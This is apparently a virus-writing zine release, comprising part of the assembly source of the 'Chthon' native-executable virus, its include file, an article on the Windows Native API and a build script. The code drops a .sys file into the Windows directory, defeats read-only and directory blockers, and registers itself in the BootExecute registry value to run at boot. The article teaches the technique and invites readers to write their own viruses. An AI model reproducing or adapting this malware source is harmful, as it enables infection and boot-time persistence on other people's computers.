        db      0fh, 3, 0bh, 1, 56h, syssize, 10h
        dd      00001001010010001011000010100001b
        ;       z   02r   04mz   05mz   02mz   02
        db      0ch, 40h, 10h
        dd      00000110000100110001000011111000b
        ;       z   01mz   02r   08mz   03mmm
        db      2, 4, "pow"
        dd      00001010000101000111100001110001b
        ;       z   02mz   02mz   07mz   03mz  04
        db      ((offset chthon_codeend - offset chthon_begin + syssize + 1fffh) and not 0fffh) shr 8, syssize, 1, 1
        dd      10000111000010100001101010010010b
        ;       mz   03mz   02mz   03r   04mz  08
        db      10h, ((offset chthon_codeend - offset chthon_begin + syssize + 1ffh) and not 1ffh) shr 8, 1, 2
        dd      00001011100011000000000000000000b
        ;       z   02mmmz   06
        db      60h, 8, 10h
        dd      0
;decompressed data follow.  'X' bytes are set to random value every time
;       db      'M', 'Z'                ;00
;       db      "ntdll.dll", 0          ;02    align 4, filler (overload for dll name and import lookup table RVA)
;       db      'P', 'E', 0, 0          ;0c 00 signature (overload for date/time stamp)
;       dw      14ch                    ;10 04 machine (overload for forwarder chain)
;       dw      1                       ;12 06 number of sections (overload for forwarder chain)
;       dd      2                       ;14 08 date/time stamp (overload for dll name RVA)
;       dd      102ch                   ;18 0c pointer to symbol table (overload for import address table RVA)
;       db      X, X, X, X              ;1c 10 number of symbols
;       dw      40h                     ;20 14 size of optional header
;       dw      30fh                    ;22 16 characteristics
;       dw      10bh                    ;24 18 magic
;       db      X                       ;26 1a major linker
;       db      X                       ;27 1b minor linker
;       dd      0                       ;28 1c size of code (overload for import table terminator)
;       dd      56h                     ;2c 20 size of init data (overload for import name table RVA)
;       dd      0                       ;30 24 size of uninit data (overload for import name table terminator)
;       dd      syssize + 1000h         ;34 28 entry point
;       db      X, X, X, X              ;38 2c base of code
;       dd      0ch                     ;3c 30 base of data (overload for lfanew)
;       dd      400000h                 ;40 34 image base
;       dd      1000h                   ;44 38 section align
;       dd      200h                    ;48 3c file align
;       db      X, X                    ;4c 40 major os
;       db      X, X                    ;4e 42 minor os
;       db      X, X                    ;50 44 major image
;       db      X, X                    ;52 46 minor image
;       dw      4                       ;54 48 major subsys
;       dw      0                       ;56 4a minor subsys (overload for import name table)
;       db      "pow", 0                ;58 4c reserved (overload for import name table)
;       dd      (aligned size of code)  ;5c 50 size of image
;       dd      syssize                 ;60 54 size of headers
;       dd      0                       ;64 58 checksum (overload for section name)
;       dw      1                       ;68 5c subsystem (overload for section name)
;       dw      0                       ;6a 5e dll characteristics (overload for section name)
;       dd      1                       ;6c 60 size of stack reserve (overload for virtual size)
;       dd      1000h                   ;70 64 size of stack commit (overload for virtual address)
;       dd      (aligned size of code)  ;74 68 size of heap reserve (overload for file size)
;       dd      1                       ;78 6c size of heap commit (overload for file offset)
;       db      X, X, X, X              ;7c 70 loader flags (overload for pointer to relocs)
;       dd      2                       ;80 74 number of rva and sizes (overload for pointer to line numbers)
;       dd      0                       ;84 78 export (overload for reloc table and line numbers)
;       dd      60000000h               ;88 7c export (overload for section characteristics)
;       dd      1008h                   ;8c 80 import
;       dd      0                       ;90 84 import
;                                       ;94

drop_sys        label   near
        mov     ebx, esp
        lea     esi, dword ptr [edi + offset syslabel - offset drop_sys]
        mov     edi, offset chthon_codeend - offset chthon_begin + syssize + 1ffh
        push    edi
        xor     ebp, ebp                        ;GMEM_FIXED
        push    ebp
        call    dword ptr [ebx + execrcstk.eGlobalAlloc]
        push    eax                             ;GlobalFree
        push    ebp                             ;WriteFile
        push    esp                             ;WriteFile
        push    edi                             ;WriteFile
        push    eax                             ;WriteFile
        push    ebp                             ;CreateFileA
        push    ebp                             ;CreateFileA
        push    CREATE_ALWAYS                   ;CreateFileA
        push    ebp                             ;CreateFileA
        push    ebp                             ;CreateFileA
        push    GENERIC_WRITE                   ;CreateFileA
        push    eax                             ;CreateFileA
        lea     ecx, dword ptr [eax + 7fh]
        push    ecx                             ;MoveFileA
        push    eax                             ;MoveFileA
        push    eax                             ;GetFileAttributesA
        push    ebp                             ;SetFileAttributesA
        push    eax                             ;SetFileAttributesA
        push    ecx                             ;DeleteFileA
        push    ecx                             ;GetTempFileNameA
        push    ebp                             ;GetTempFileNameA
        push    esp                             ;GetTempFileNameA
        push    eax                             ;GetTempFileNameA
        push    edi                             ;GetWindowsDirectoryA
        push    eax                             ;GetWindowsDirectoryA
        xchg    ebp, eax
        call    dword ptr [ebx + execrcstk.eGetWindowsDirectoryA]
        lea     edi, dword ptr [ebp + eax - 1]
        call    dword ptr [ebx + execrcstk.eGetTempFileNameA]
        call    dword ptr [ebx + execrcstk.eDeleteFileA]
        mov     al, '\'
        scas    byte ptr [edi]
        je      skip_slash
        stos    byte ptr [edi]

;-----------------------------------------------------------------------------
;append sys name, assumes name is 0ch bytes long
;-----------------------------------------------------------------------------

skip_slash      label   near
        movs    dword ptr [edi], dword ptr [esi]
        movs    dword ptr [edi], dword ptr [esi]
        movs    dword ptr [edi], dword ptr [esi]

;-----------------------------------------------------------------------------
;anti-anti-file dropper - remove read-only attribute, delete file, rename directory
;-----------------------------------------------------------------------------

        call    dword ptr [ebx + execrcstk.eSetFileAttributesA]
        call    dword ptr [ebx + execrcstk.eGetFileAttributesA]
        test    al, FILE_ATTRIBUTE_DIRECTORY
        pop     ecx
        pop     eax
        je      skip_move
        push    eax
        push    ecx
        call    dword ptr [ebx + execrcstk.eMoveFileA]

skip_move       label   near
        call    dword ptr [ebx + execrcstk.eCreateFileA]
        push    ebx
        xchg    ebp, eax
        xchg    edi, eax
        call    dword ptr [ebx + execrcstk.eGetTickCount]
        xchg    ebx, eax
        xor     ecx, ecx

;-----------------------------------------------------------------------------
;decompress sys MZ header, PE header, section table, import table
;-----------------------------------------------------------------------------

        lods    dword ptr [esi]

copy_bytes      label   near
        movs    byte ptr [edi], byte ptr [esi]

test_bits       label   near
        add     eax, eax
        jb      copy_bytes
        add     eax, eax
        sbb     dl, dl
        and     dl, bl
        shld    ecx, eax, 4
        rol     ebx, cl
        shl     eax, 4
        xchg    edx, eax
        rep     stos byte ptr [edi]
        xchg    edx, eax
        jne     test_bits
        lods    dword ptr [esi]
        test    eax, eax
        jne     test_bits
        mov     cx, offset chthon_codeend - offset chthon_begin
        sub     esi, offset drop_sys - offset chthon_begin
        rep     movs byte ptr [edi], byte ptr [esi]
        xchg    ecx, eax
        pop     ebx
        pop     edi
        pop     ecx
        push    ecx
        push    edi
        push    ecx
        mov     edx, dword ptr [edi + mzhdr.mzlfanew]
        lea     edx, dword ptr [edi + edx + pehdr.pechksum]
	inc	ecx
	shr	ecx, 1
	clc

exe_checksum    label   near
	adc	ax, word ptr [edi]
	inc	edi
	inc	edi
        loop    exe_checksum
        pop     dword ptr [edx]
        adc     dword ptr [edx], eax            ;avoid common bug.  ADC not ADD
        push    ebp
        call    dword ptr [ebx + execrcstk.eWriteFile]
        push    ebp
        call    dword ptr [ebx + execrcstk.eCloseHandle]
        call    dword ptr [ebx + execrcstk.eGlobalFree]
        sub     esi, offset chthon_codeend - offset regdll
        push    esi
        call    dword ptr [ebx + execrcstk.eLoadLibraryA]
        inc     eax
        xchg    edi, eax
        call    find_mzhdr

;-----------------------------------------------------------------------------
;API CRC table, null terminated
;-----------------------------------------------------------------------------

regcrcbegin     label   near                    ;place < 80h bytes from call for smaller code
        dd      (regcrc_count + 1) dup (0)
regcrcend       label   near
        dd      offset reg_file - offset regcrcend + 4

regkey  db      "system\currentcontrolset\control\session manager", 0
regval  db      "autocheck autochk *", 0, sysname, 0, 0
regnam  db      "bootexecute", 0
regdll  db      "advapi32", 0

reg_file        label   near
        mov     ebx, esp
        push    eax
        push    esp
        sub     edi, offset reg_file - offset regkey
        push    edi
        push    HKEY_LOCAL_MACHINE
        call    dword ptr [ebx + regcrcstk.rRegOpenKeyA]
        pop     eax
        push    eax
        push    offset regnam - offset regval
        add     edi, offset regval - offset regkey
        push    edi
        push    REG_MULTI_SZ
        push    0
        add     edi, offset regnam - offset regval
        push    edi
        push    eax
        call    dword ptr [ebx + regcrcstk.rRegSetValueExA]
        call    dword ptr [ebx + regcrcstk.rRegCloseKey]
        add     esp, size execrcstk + size regcrcstk
        popad
        ret     0ch
chthon_dllcode  endp
chthon_tlscode  endp
chthon_codeend  label   near
chthon_begin    endp
end     dropper
컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴�[CHTHON.ASM]컴�
컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴�[CHTHON.INC]컴�
DLL_PROCESS_ATTACH              equ     1
DLL_THREAD_ATTACH               equ     2

MAX_PATH                        equ     260

FILE_DIRECTORY_FILE             equ     00000001h
FILE_SYNCHRONOUS_IO_NONALERT    equ     00000020h
FILE_OPEN_FOR_BACKUP_INTENT     equ     00004000h

FILE_SHARE_READ                 equ     00000001
FILE_SHARE_WRITE                equ     00000002

FILE_READ_DATA                  equ     0001h
FILE_LIST_DIRECTORY             equ     0001h
FILE_WRITE_DATA                 equ     0002h
FILE_APPEND_DATA                equ     0004h
FILE_WRITE_ATTRIBUTES           equ     0100h

SYNCHRONIZE                     equ     00100000h

FileBothDirectoryInformation    equ     3
FileBasicInformation            equ     4

FILE_ATTRIBUTE_DIRECTORY        equ     00000010h
FILE_ATTRIBUTE_ARCHIVE          equ     00000020h

IMAGE_FILE_MACHINE_I386         equ     14ch    ;14d/14e do not exist.  if you don't believe, then try it

IMAGE_FILE_RELOCS_STRIPPED      equ     0001h
IMAGE_FILE_EXECUTABLE_IMAGE     equ     0002h
IMAGE_FILE_32BIT_MACHINE        equ     0100h
IMAGE_FILE_SYSTEM               equ     1000h
IMAGE_FILE_DLL                  equ     2000h
IMAGE_FILE_UP_SYSTEM_ONLY       equ     4000h

IMAGE_SUBSYSTEM_WINDOWS_GUI     equ     2
IMAGE_SUBSYSTEM_WINDOWS_CUI     equ     3

RANDPADMIN                      equ     4096
RANDPADMAX                      equ     2048    ;RANDPADMIN is added to this

PAGE_READWRITE                  equ     04

STANDARD_RIGHTS_REQUIRED        equ     000F0000h
SECTION_QUERY                   equ     0001
SECTION_MAP_WRITE               equ     0002
SECTION_MAP_READ                equ     0004

IMAGE_SCN_MEM_WRITE             equ     80000000h

CREATE_ALWAYS                   equ     2

GENERIC_WRITE                   equ     40000000h

HKEY_LOCAL_MACHINE              equ     80000002h

KEY_SET_VALUE                   equ     2

REG_MULTI_SZ                    equ     7

align           1                               ;byte-packed structures
krncrcstk       struct
        kRtlSetCurrentDirectory_U       dd      ?
        kRtlRandom                      dd      ?
        kRtlFreeHeap                    dd      ?
        kRtlDosPathNameToNtPathName_U   dd      ?
        kRtlAllocateHeap                dd      ?
        kNtUnmapViewOfSection           dd      ?
        kNtSetInformationFile           dd      ?
        kNtQueryDirectoryFile           dd      ?
        kNtOpenFile                     dd      ?
        kNtMapViewOfSection             dd      ?
        kNtCreateSection                dd      ?
        kNtClose                        dd      ?
krncrcstk       ends
krncrc_count    equ     size krncrcstk shr 2

execrcstk       struct
        eWriteFile              dd      ?
        eSetFileAttributesA     dd      ?
        eMoveFileA              dd      ?
        eLoadLibraryA           dd      ?
        eGlobalFree             dd      ?
        eGlobalAlloc            dd      ?
        eGetWindowsDirectoryA   dd      ?
        eGetTickCount           dd      ?
        eGetTempFileNameA       dd      ?
        eGetFileAttributesA     dd      ?
        eDeleteFileA            dd      ?
        eCreateFileA            dd      ?
        eCloseHandle            dd      ?
execrcstk       ends
execrc_count    equ     size execrcstk shr 2

regcrcstk       struct
        rRegSetValueExA         dd      ?
        rRegOpenKeyA            dd      ?
        rRegCloseKey            dd      ?
regcrcstk       ends
regcrc_count    equ     size regcrcstk shr 2

tlsstruc        struct
        tlsrawbeg       dd      ?
        tlsrawend       dd      ?
        tlsindex        dd      ?
        tlsfuncptr      dd      ?
        tlsfiller       dd      ?
        tlsflags        dd      ?
        tlsfunc         dd      2 dup (?)
tlsstruc        ends

initstk         struct
        initret         dd      ?
        initDLLHandle   dd      ?
        initReason      dd      ?
        initReserved    dd      ?
initstk         ends

UNICODE_STRING          struct
        UniLength       dw      ?
        MaximumLength   dw      ?
        Buffer          dd      ?
UNICODE_STRING          ends

UNICODE_STRINGDD        struct
        UniString       UNICODE_STRING  ?
        RootDir         dd              ?
UNICODE_STRINGDD        ends

LARGE_INTEGER   struct
        dwordLow        dd      ?
        dwordHigh       dd      ?
LARGE_INTEGER   ends

FILE_DIRECTORY_INFORMATION      struct
        dirNextEntryOffset      dd              ?
        dirUnknown1             dd              ?
        dirCreationTime         LARGE_INTEGER   ?
        dirLastAccessTime       LARGE_INTEGER   ?
        dirLastWriteTime        LARGE_INTEGER   ?
        dirChangeTime           LARGE_INTEGER   ?
        dirRealFileSize         LARGE_INTEGER   ?
        dirAllocatedSize        LARGE_INTEGER   ?
        dirFileAttributes       dd              ?
        dirFileNameLength       dd              ?
        dirUnknown2             dw              0fh dup (?)
        dirFileName             dw              MAX_PATH + 1 dup (?)
FILE_DIRECTORY_INFORMATION      ends

findlist        struct
        findprev        dd                              ?
        findhand        dd                              ?
        findname        UNICODE_STRING                  ?
        findmask        UNICODE_STRINGDD                ?
        finddata        FILE_DIRECTORY_INFORMATION      ?
findlist        ends

coffhdr         struct
        pemachine       dw      ?               ;04
        pesectcount     dw      ?               ;06
        petimedate      dd      ?               ;08
        pesymbrva       dd      ?               ;0C
        pesymbcount     dd      ?               ;10
        peopthdrsize    dw      ?               ;14
        peflags         dw      ?               ;16
coffhdr         ends

pedir           struct
        dirrva          dd      ?
        dirsize         dd      ?
pedir           ends

pehdr           struct
        pesig           dd      ?               ;00
        pecoff          coffhdr <?>
        pemagic         dw      ?               ;18
        pemajorlink     db      ?               ;1A
        peminorlink     db      ?               ;1B
        pecodesize      dd      ?               ;1C
        peidatasize     dd      ?               ;20
        peudatasize     dd      ?               ;24
        peentrypoint    dd      ?               ;28
        pecodebase      dd      ?               ;2C
        pedatabase      dd      ?               ;30
        peimagebase     dd      ?               ;34
        pesectalign     dd      ?               ;38
        pefilealign     dd      ?               ;3C
        pemajoros       dw      ?               ;40
        peminoros       dw      ?               ;42
        pemajorimage    dw      ?               ;44
        peminorimage    dw      ?               ;46
        pemajorsubsys   dw      ?               ;48
        peminorsubsys   dw      ?               ;4A
        pereserved      dd      ?               ;4C
        peimagesize     dd      ?               ;50
        pehdrsize       dd      ?               ;54
        pechksum        dd      ?               ;58
        pesubsys        dw      ?               ;5C
        pedllflags      dw      ?               ;5E
        pestackmax      dd      ?               ;60
        pestacksize     dd      ?               ;64
        peheapmax       dd      ?               ;68
        peheapsize      dd      ?               ;6C
        peldrflags      dd      ?               ;70
        pervacount      dd      ?               ;74
        peexport        pedir   <?>             ;78
        peimport        pedir   <?>             ;80
        persrc          pedir   <?>             ;88
        peexcpt         pedir   <?>             ;90
        pesecurity      pedir   <?>             ;98
        pereloc         pedir   <?>             ;A0
        pedebug         pedir   <?>             ;A8
        pearch          pedir   <?>             ;B0
        peglobal        pedir   <?>             ;B8
        petls           pedir   <?>             ;C0
        peconfig        pedir   <?>             ;C8
        pebound         pedir   <?>             ;D0
        peiat           pedir   <?>             ;D8
        pedelay         pedir   <?>             ;E0
        pecom           pedir   <?>             ;E8
        persrv          pedir   <?>             ;F0
pehdr           ends

peexp           struct
        expflags        dd      ?
        expdatetime     dd      ?
        expmajorver     dw      ?
        expminorver     dw      ?
        expdllrva       dd      ?
        expordbase      dd      ?
        expadrcount     dd      ?
        expnamecount    dd      ?
        expadrrva       dd      ?
        expnamerva      dd      ?
        expordrva       dd      ?
peexp           ends

tib     struct
        ExceptReg       dd      ?
        StackBase       dd      ?
        StackLimit      dd      ?
        SubSystem       dd      ?
        FiberData       dd      ?
        UserPointer     dd      ?
        TibSelf         dd      ?
        TibUnknown      dd      5 dup (?)
        TibTeb          dd      ?
tib     ends

teb     struct
        tebUnknown      dd      6 dup (?)
        heaphand        dd      ?
teb     ends

OBJECT_ATTRIBUTES       struct
        ObjLength                       dd      ?
        RootDirectory                   dd      ?
        ObjectName                      dd      ?
        Attributes                      dd      ?
        SecurityDescriptor              dd      ?
        SecurityQualityOfService        dd      ?
OBJECT_ATTRIBUTES       ends

openstk         struct
        openobj         OBJECT_ATTRIBUTES       <?>
        openname        UNICODE_STRING          <?>
        openedi         dd                      ?
        openebx         dd                      ?
openstk         ends

FILE_BASIC_INFORMATION  struct
        basCreationTime         LARGE_INTEGER       ?
        basLastAccessTime       LARGE_INTEGER       ?
        basLastWriteTime        LARGE_INTEGER       ?
        basChangeTime           LARGE_INTEGER       ?
        basFileAttributes       dd                  ?
        basUnknown              dd                  ?       ;missing from docs?
FILE_BASIC_INFORMATION  ends

mzhdr           struct
        mzsig           dw      ?               ;00
        mzpagemod       dw      ?               ;02
        mzpagediv       dw      ?               ;04
        mzrelocs        dw      ?               ;06
        mzhdrsize       dw      ?               ;08
        mzminalloc      dw      ?               ;0A
        mzmaxalloc      dw      ?               ;0C
        mzss            dw      ?               ;0E
        mzsp            dw      ?               ;10
        mzchksum        dw      ?               ;12
        mzip            dw      ?               ;14
        mzcs            dw      ?               ;16
        mzreloff        dw      ?               ;18
        mzfiller        db      22h dup (?)     ;1A
        mzlfanew        dd      ?               ;3C
mzhdr           ends

pesect          struct
        sectname        db      8 dup (?)
        sectvirtsize    dd      ?
        sectvirtaddr    dd      ?
        sectrawsize     dd      ?
        sectrawaddr     dd      ?
        sectreladdr     dd      ?
        sectlineaddr    dd      ?
        sectrelcount    dw      ?
        sectlinecount   dw      ?
        sectflags       dd      ?
pesect          ends

mapsehstk       struct
        mapsehprev      dd      ?
        mapsehexcpt     dd      ?
        mapsehregs      dd      8 dup (?)
        mapsehsehret    dd      ?
        mapsehinfret    dd      ?
mapsehstk       ends

infectstk       struct
        infdelta        dd              ?
        infmapview      dd              ?
        inffilesize     dd              ?
        infseh          mapsehstk       <?>
infectstk       ends
align                                           ;restore default alignment
컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴�[CHTHON.INC]컴�
컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴�[NATIVE.TXT]컴�
                                The Native API
                              roy g biv / defjam

                                 -= defjam =-
                                  since 1992
                     bringing you the viruses of tomorrow
                                    today!


Prologue:

Please excuse my English.  I'm still learning.


About the author:

Former  DOS/Win16  virus writer, author of several virus  families,  including
Ginger  (see Coderz #1 zine for terrible buggy example, contact me for  better
sources  ;),  and  Virus Bulletin 9/95 for a description of what  they  called
Rainbow.   Co-author  of  world's first virus using circular  partition  trick
(Orsam,  coded  with  Prototype in 1993).  Designer of the world's  first  XMS
swapping  virus (John Galt, coded by RTFishel in 1995, only 30 bytes stub, the
rest  is  swapped  out).   Author of world's first virus  using  Thread  Local
Storage  for  replication (Shrug).  Author of various retrovirus articles  (eg
see Vlad #7 for the strings that make your code invisible to TBScan).  Went to
sleep  for  a number of years.  This is my third virus for Win32.  It  is  the
world's first Native executable virus.  It took me weeks to research it.

I'm also available for joining a group.  Just in case anyone is interested. ;)


What are native applications?

I found out about native applications on the Sysinternals site.
(www.sysinternals.com/ntw2k/info/native.shtml)
The  guy  describes there some things about how these files are  executed  and
which  APIs  they can use.  There are some bugs in his description, but mostly
it is good enough.  Native applications run in NT/2000/XP and they load before
the  Win32 subsystem loads (kernel32, user32, etc).  They have full access  to
the  file system and no privilege checks!  Most of the APIs are  undocumented,
but  if  you debug the kernel32 APIs, you see that they call the  native  APIs
(ntdll) and you can work out the important parameters.

Some points now:
Native applications can run from %Windows%, not just %System%.
The heap handle is available via [fs:[0x30]+0x18]).  No need to create heap.
NtProcessTerminate() runs if application crashes (so crash to save bytes :) ).
Native  applications must terminate before Win32 subsystem can load, so it  is
important to not take too much time.  There is no background execution here.


How to build a native application?

You'll need a copy of ntdll.lib to build a native application, but you can use
the native API without being a native application - just use GetModuleHandle()
to  load ntdll then GetProcAddress(), but know that privilege checks apply  to
native APIs used by not-native applications.


How to run a native application?

Native  applications use subsystem value of 1 and must have a valid  checksum.
They can be loaded using the registry by altering the data in

HKLM\System\CurrentControlSet\Control\SessionManager\BootExecute

This  is  a MULT_SZ type so it is an array of null-terminated   strings,  with
extra  null  to  end the list.  When the entry point is  executed,  the  stack
contains  no return value.  Since I couldn't find anywhere that has the  ntdll
image  base, probably you must search memory.  I import a function from  ntdll
to know where to start looking.  They cannot be executed directly (but you can
use  RtlCreateProcess() to execute for testing, however SoftIce won't break on
hard-coded int 3, so be careful).


How to use the native APIs?

Here  are  the APIs from ntdll.dll that I have used.  The ones marked 'x'  are
unknown  to me, but the values are set by kernel32 and I had no need to change
them.  IO_STATUS_BLOCKs are altered just before the call returns, so if you do
not care about the status, then point with esp and it will be discarded.


DWORD NtClose /* kernel32 equivalent: CloseHandle */
(
        HANDLE                  filehand        /* IN */
)

DWORD NtCreateSection /* kernel32 equivalent: CreateFileMapping */
(
        PHANDLE                 secthand        /* OUT */
        DWORD                   sectaccess      /* IN */
        x                       0               /* IN */
        PQWORD                  filesize        /* IN */
        DWORD                   pageaccess      /* IN */
        x                       0x08000000      /* IN */
        HANDLE                  filehandle      /* IN */
)

DWORD NtMapViewOfSection /* kernel32 equivalent: MapViewOfFile */
(
        HANDLE                  secthand        /* IN */
        x                       -1              /* IN */
        PVOID                   mapview         /* OUT */
        x                       0               /* IN */
        x                       0               /* IN */
        PQWORD                  origin          /* IN */
        PQWORD                  mapsize         /* IN */
        x                       1               /* IN */
        x                       0               /* IN */
        DWORD                   pageaccess      /* IN */
)

DWORD NtOpenFile /* kernel32 equivalent: none
                    Similar  to CreateFile when OPEN_EXISTING, but directories
                    must also be opened with this function, in order to access
                    the files inside
                 */
(
        PHANDLE                 filehand        /* IN */
        ACCESS_MASK             access          /* IN */
        POBJECT_ATTRIBUTES      objattr         /* IN */
        PIO_STATUS_BLOCK        status          /* OUT */
        DWORD                   share           /* IN */
        DWORD                   flags           /* IN */
)

DWORD NtQueryDirectoryFile /* kernel32 equivalent: FindFirstFile (restart: 1)
                                                   FindNextFile (restart: 0)
                           */
(
        HANDLE                  filehand        /* IN */
        HANDLE                  event           /* IN */
        x                       0               /* IN */
        x                       0               /* IN */
        PIO_STATUS_BLOCK        status          /* OUT */
        PVOID                   fileinfo        /* OUT */
        DWORD                   infosize        /* IN */
        FILE_INFORMATION_CLASS  class           /* IN */
        BOOLEAN                 single          /* IN */
        PUNICODE_STRING         filename        /* IN */
        BOOLEAN                 restart         /* IN */
)

DWORD NtSetInformationFile /* kernel32 equivalent: none
                              Combines SetFileAttibutes and SetFileTime
                              (can set either or both in single call)
                           */
(
        HANDLE                  filehand        /* IN */
        PIO_STATUS_BLOCK        status          /* OUT */
        PVOID                   fileinfo        /* IN */
        DWORD                   infosize        /* IN */
        FILE_INFORMATION_CLASS  class           /* IN */
)

DWORD NtUnmapViewOfSection /* kernel32 equivalent: UnmapViewOfFile */
(
        x                       -1              /* IN */
        PVOID                   mapview         /* IN */
)

PVOID RtlAllocateHeap /* kernel32 equivalent: HeapAlloc */
(
        HANDLE                  heaphand        /* IN */
        DWORD                   flags           /* IN */
        DWORD                   size            /* IN */
)

BOOLEAN RtlDosPathNameToNtPathName_U /* kernel32 equivalent: none
                                        Similar to GetFullPathName
                                     */
(
        PWSTR                   inpath          /* IN */
        PUNICODE_STRING         devname         /* OUT */
                                     /* and .Buffer must be freed by caller */
        PWSTR                   filename        /* OUT */
        PUNICODE_STRING         outpath         /* OUT */
)

BOOLEAN RtlFreeHeap /* kernel32 equivalent: HeapFree */
(
        HANDLE                  heaphand        /* IN */
        DWORD                   flags           /* IN */
        PVOID                   buffer          /* IN */
)

DWORD RtlRandom /* kernel32 equivalent: none
                   GetTickCount can be used, but it's not really random
                */
(
        PDWORD                  seed            /* IN */
)

DWORD RtlSetCurrentDirectory_U /* kernel32 equivalent: SetCurrentDirectory */
(
        PUNICODE_STRING         subdir          /* IN */
)


Epilogue:

Now  you  want to look at my example code and then to make your own  examples.
There   are  many  possibilities  with  this  technique  that  make  it   very
interesting.  It is easy when you know how.  Just use your imagination.


Greets to the old Defjam crew:

Prototype, RTFishel, Obleak, and The Gingerbread Man


rgb/dj nov 2001
iam_rgb@hotmail.com
컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴�[NATIVE.TXT]컴�
컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴�[MAKE.BAT]컴�
@echo off
if %1.==. goto usage
%tasm32%\bin\tasm32 /r /ml /m9 /os /p /q /w2 /zn %1
if errorlevel 1 goto end
%tasm32%\bin\tlink32 /c /B:400000 /Tpe /aa /x /n %1.obj,,,%tasm32%\lib\import32.lib,
del %1.obj
goto end

:usage
echo.
echo Usage: MAKE filename
echo eg. MAKE CHTHON
echo requires %tasm32% set to TASM directory (eg C:\TASM)

:end
echo.
컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴�[MAKE.BAT]컴�
